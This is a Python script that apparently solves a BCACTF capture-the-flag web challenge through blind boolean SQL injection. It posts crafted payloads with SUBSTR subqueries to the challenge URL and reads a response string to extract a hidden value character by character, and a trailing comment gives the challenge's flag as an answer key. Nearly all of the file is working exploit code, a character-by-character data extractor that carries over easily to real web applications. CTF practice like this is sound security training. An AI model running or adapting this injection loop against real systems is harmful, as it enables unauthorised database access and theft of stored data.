import requests as req
import string

domain = string.ascii_letters + string.digits + "\n" + "/|,}{_.:!@$^&*()#"
url = "http://challs.bcactf.com:30489/ai"
check = "AI brain overheated"

def get_flag():
    temp = ""
    index = 1
    loop = 0
    
    while True:
        if loop == 1:
            print("\nColumn name => " + temp + "\n")
            return temp
            
        elif loop == 0:
            for char in domain:
                payload = "a'and (select SUBSTR(response_text, {}, 1) FROM 'response' WHERE resp_order=2) = '{}' --".format(index, char)
                data = dict(query=payload)
                print(data)
                r = req.post(url, data)

                if check not in r.text:
                    temp += char
                    index += 1
                    print(temp)
                    break
                
                elif char == "#":
                    loop = 1

get_flag() # bcactf{a_d!fFer3nT_k!nD_0f_!nJ3c7i0n!_rf8eyeiw}